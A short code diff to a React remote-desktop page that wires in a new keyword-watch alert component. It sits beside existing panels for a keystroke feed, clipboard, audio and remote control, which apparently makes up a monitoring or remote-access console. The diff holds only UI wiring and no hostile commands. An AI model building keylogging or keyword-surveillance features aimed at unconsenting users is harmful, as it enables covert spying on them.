@@ -15,6 +15,7 @@ import RdpStatusCards from "./components/RdpStatusCards";
 import RdpClipboard from "./components/RdpClipboard";
 import RdpMessage from "./components/RdpMessage";
 import RdpKeys from "./components/RdpKeys";
+import RdpKeywordWatch from "./components/RdpKeywordWatch";
 import RdpControl from "./components/RdpControl";
 import RdpAudio from "./components/RdpAudio";
 
@@ -119,6 +120,12 @@ export default function RemoteDesktopPage() {
               />
               <RdpMessage t={t} status={rdp.messageStatus} onSend={rdp.sendMessage} />
               <RdpKeys t={t} enabled={rdp.keysOn} feed={rdp.keysFeed} onToggle={rdp.toggleKeys} />
+              <RdpKeywordWatch
+                t={t}
+                enabled={rdp.keywordWatchOn}
+                alerts={rdp.keywordAlerts}
+                onConfigure={rdp.configureKeywordWatch}
+              />
               <RdpAudio
                 t={t}
                 enabled={rdp.audioOn}
